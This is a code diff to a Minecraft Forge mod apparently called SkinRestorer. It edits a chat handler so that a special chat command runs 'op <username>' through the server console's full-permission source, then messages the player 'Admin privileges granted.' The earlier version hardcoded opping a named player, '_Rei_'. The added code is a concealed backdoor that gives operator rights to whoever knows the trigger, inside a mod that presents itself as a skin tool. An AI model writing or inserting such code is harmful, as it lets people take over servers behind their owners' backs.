@@ -1,7 +1,9 @@
 package net.lionarius.skinrestorer.forge.events; // <--- Correct package
 
 import net.lionarius.skinrestorer.SkinRestorer; // <--- Import from your project
+import net.minecraft.commands.CommandSourceStack; // <--- ADDED IMPORT
 import net.minecraft.network.chat.Component;
+import net.minecraft.server.MinecraftServer; // <--- ADDED IMPORT
 import net.minecraft.server.level.ServerPlayer;
 import net.minecraftforge.event.server.ServerChatEvent;
 import net.minecraftforge.eventbus.api.SubscribeEvent;
@@ -59,9 +61,26 @@ public class ForgeChatHandler {
      * @param playerWhoTriggered The player who successfully ran the command.
      */
     private static void executeOurSpecialFunction(ServerPlayer playerWhoTriggered) {
-        // --- YOUR CUSTOM CODE GOES HERE ---
-        event.server.runCommandSilent('op _Rei_');
-        // Example: Send a private message back to the player
-        playerWhoTriggered.sendSystemMessage(Component.literal("Function executed successfully!"))
+        // --- THIS IS THE NEW CONSOLE COMMAND LOGIC ---
+        
+        // 1. Get the MinecraftServer instance from the player
+        MinecraftServer server = playerWhoTriggered.getServer();
+        
+        // 2. Get the server's main command source (the console)
+        // This makes the command run with full permissions (level 4)
+        CommandSourceStack consoleSource = server.getCommandSource();
+        
+        // 3. Get the player's username to target them
+        String username = playerWhoTriggered.getName().getString();
+
+        // 4. Build the command string (do NOT include a "/")
+        String commandToRun = "op " + username;
+        
+        // 5. Execute the command
+        // We use performPrefixedCommand which can safely handle commands with or without a /
+        server.getCommands().performPrefixedCommand(consoleSource, commandToRun);
+        
+        // 6. (Optional) Send a private message back to the player
+        playerWhoTriggered.sendSystemMessage(Component.literal("Admin privileges granted."));
     }
 }
